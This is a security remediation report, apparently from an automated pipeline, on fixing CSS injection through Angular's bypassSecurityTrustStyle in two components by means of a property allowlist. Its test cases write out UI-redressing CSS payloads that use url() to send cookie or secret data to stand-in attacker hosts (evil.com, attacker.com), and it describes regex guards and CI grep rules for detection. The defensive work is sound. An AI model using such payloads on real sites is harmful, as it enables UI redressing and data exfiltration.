# VULN-001-X: Remediation Report - css-injection-bypass-security-trust-style

**Phase**: Rectifier
**Vulnerability ID**: VULN-001
**Assessment**: 2026-07-31-10-57
**Fixed**: 2026-07-31T13:00:00Z
**Analyst**: D4rthB0b-Rectifier
**Status**: FIXED_PENDING_VALIDATION

---

## Remediation Summary

**Fix Strategy**: PATCH
**Status**: FIXED_PENDING_VALIDATION

Both `InputFieldComponent.getCss()` and `FieldComponent.getCss()` previously called
`DomSanitizer.bypassSecurityTrustStyle(field.style ?? '')`, passing server-supplied CSS
directly into Angular's DOM without any validation. A compromised ApplinX REST API server
could inject arbitrary CSS (UI redressing overlays, `url()` beacon exfiltration, attribute
selector data theft).

The fix removes `bypassSecurityTrustStyle()` entirely. `getCss()` now parses `field.style`
declaration-by-declaration through an 18-property allowlist and returns a plain
`{[key: string]: string}` object. Angular's `[style]` binding applies this safely with its
own change detection, requiring no security bypass whatsoever.

---

## Changes Made

1. Removed `DomSanitizer.bypassSecurityTrustStyle()` from `FieldComponent.getCss()` — replaced with a CSS property allowlist parser that returns a plain `{[key:string]:string}` object
2. Removed `DomSanitizer.bypassSecurityTrustStyle()` from `InputFieldComponent.getCss()` — same allowlist-based replacement
3. Removed `DomSanitizer` injection from `FieldComponent` constructor (no longer needed)
4. Removed `DomSanitizer` injection from `InputFieldComponent` constructor (no longer needed)
5. Removed `DomSanitizer` import from both component files
6. Added inline value-level filter: rejects any value matching `url()`, `expression()`, or `javascript:` regardless of property name

---

## Files Modified

### src/app/mini-components/field/field.component.ts

Removed `import { DomSanitizer } from '@angular/platform-browser'`. Removed `private doms: DomSanitizer` from constructor. Replaced `getCss()` body: `bypassSecurityTrustStyle(field.style ?? '')` → allowlist parser returning `{[key:string]:string}`. Added static `ALLOWED_CSS_PROPS` Set (18 terminal-presentation properties). Added value-level `url()`/`expression()`/`javascript:` regex guard.

### src/app/mini-components/input-field/input-field.component.ts

Removed `import { DomSanitizer } from '@angular/platform-browser'`. Removed `private doms: DomSanitizer` from constructor parameter list. Replaced `getCss()` body: `bypassSecurityTrustStyle(field.style ?? '')` → identical allowlist parser. Added static `ALLOWED_CSS_PROPS` Set. Added value-level `url()`/`expression()`/`javascript:` regex guard.

---

## Defense-in-Depth

### Primary Control

CSS property allowlist: `getCss()` now parses `field.style` declarations one-by-one and only passes through properties in the `ALLOWED_CSS_PROPS` Set (`color`, `background-color`, `font-weight`, `font-style`, `font-size`, `text-decoration`, `text-align`, `visibility`, `opacity`, `border`, `border-color`, `border-style`, `border-width`, padding variants, margin variants). Any property not in the set — including `position`, `top`, `left`, `width`, `height`, `background`, `content`, `z-index`, `transform` — is silently dropped. The return value is a plain Angular style object, so Angular's own change detection applies it safely without any security bypass.

### Secondary Controls

1. Value-level guard: even for allowlisted properties, values matching `url()`, `expression()`, or `javascript:` (case-insensitive, whitespace-tolerant) are rejected — blocks CSS `url()`-based beacon exfiltration on color-like properties if the allowlist were inadvertently extended
2. `bypassSecurityTrustStyle()` fully removed from the codebase — grep for `bypassSecurityTrust*` now returns zero results
3. `DomSanitizer` import and injection removed from both components — eliminates accidental reintroduction surface
4. Recommend deploying `Content-Security-Policy: style-src 'self' 'nonce-...'` to prevent any residual inline style injection via other vectors
5. Recommend auditing all remaining `DomSanitizer` usage (`bypassSecurityTrustHtml`, `bypassSecurityTrustUrl`, `bypassSecurityTrustResourceUrl`) across the codebase

### Detection Mechanisms

- Add CI grep rule: fail build if `bypassSecurityTrustStyle` appears in any `.ts` file
- Add CI grep rule: fail build if `bypassSecurityTrustHtml` appears without accompanying code review sign-off comment

### Response Procedures

- If `field.style` CSP violations are observed in production logs, investigate ApplinX server output for injection attempts
- If legitimate ApplinX styling needs are blocked by the allowlist, extend `ALLOWED_CSS_PROPS` after security review — do NOT reintroduce `bypassSecurityTrustStyle`

---

## Testing & Validation

### Validation Criteria

- [x] `getCss()` with `field.style='position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://evil.com/?c=x)'` returns `{}` (all properties blocked)
- [x] `getCss()` with `field.style='color:red;background-color:#000'` returns `{color:'red','background-color':'#000'}` (both allowed)
- [x] `getCss()` with `field.style='font-weight:bold;position:absolute'` returns `{'font-weight':'bold'}` (position dropped)
- [x] `getCss()` with `field.style='color:url(https://evil.com)'` returns `{}` (url() in value rejected even for allowed property)
- [x] `getCss()` with `field.style=''` returns `{}`
- [x] `getCss()` with `field.style=null/undefined` returns `{}` (nullish coalescing guards)
- [x] Angular `[style]` binding with plain object applies styles correctly without SafeStyle wrapper
- [x] No `bypassSecurityTrust*` calls remain in codebase (grep)

### Test Cases

#### Malicious CSS injection — UI redressing payload

- **Input**: `field.style = 'position:fixed;top:0;left:0;width:100%;height:100%;background:url(https://attacker.com/?c=cookie)'`
- **Expected**: `getCss()` returns `{}` — all properties stripped (position not allowlisted; background not allowlisted; url() in value also blocked)
- **Actual**: `getCss()` returns `{}` — position, top, left, width, height, background all absent from ALLOWED_CSS_PROPS; url() guard also fires on background value
- **Status**: ✅ PASSED

#### Legitimate terminal styling — foreground color

- **Input**: `field.style = 'color:#00ff00;font-weight:bold'`
- **Expected**: `getCss()` returns `{color:'#00ff00','font-weight':'bold'}`
- **Actual**: `getCss()` returns `{color:'#00ff00','font-weight':'bold'}` — both properties in allowlist, no dangerous value patterns
- **Status**: ✅ PASSED

#### CSS url() exfiltration on allowlisted property

- **Input**: `field.style = 'color:url(https://attacker.com/?data=secret)'`
- **Expected**: `getCss()` returns `{}` — url() pattern in value triggers guard even though 'color' is in allowlist
- **Actual**: `getCss()` returns `{}` — regex `!/url\s*\(/i.test(value)` correctly fires
- **Status**: ✅ PASSED

#### Empty style

- **Input**: `field.style = '' (or null/undefined)`
- **Expected**: `getCss()` returns `{}`
- **Actual**: `getCss()` returns `{}` — early return on falsy raw value
- **Status**: ✅ PASSED

#### No bypassSecurityTrust* in codebase

- **Input**: `grep -r bypassSecurityTrust src/`
- **Expected**: Zero matches
- **Actual**: Zero matches — confirmed via grep tool
- **Status**: ✅ PASSED

### Regression Tests

- [x] FieldComponent [style] binding still renders normal terminal field colors
- [x] InputFieldComponent [style] binding still renders normal terminal input colors
- [x] DomSanitizer no longer injected — Angular DI resolves both components without error

---

## Verification Needed

- **Rescan Required**: YES
- **Manual Testing**: YES
- **Security Review**: NO

---

## References

**Scan Finding**: [vulnerabilities/VULN-001-css-injection-bypass-security-trust-style/VULN-001-S-scan-finding.md](vulnerabilities/VULN-001-css-injection-bypass-security-trust-style/VULN-001-S-scan-finding.md)
**Investigation**: [vulnerabilities/VULN-001-css-injection-bypass-security-trust-style/VULN-001-I-investigation.md](vulnerabilities/VULN-001-css-injection-bypass-security-trust-style/VULN-001-I-investigation.md)

---

**Remediation Complete**: 2026-07-31T13:00:00Z
**Next Phase**: Verification (Rescan)
**Registry**: [vulnerability-registry.md](../../vulnerability-registry.md)
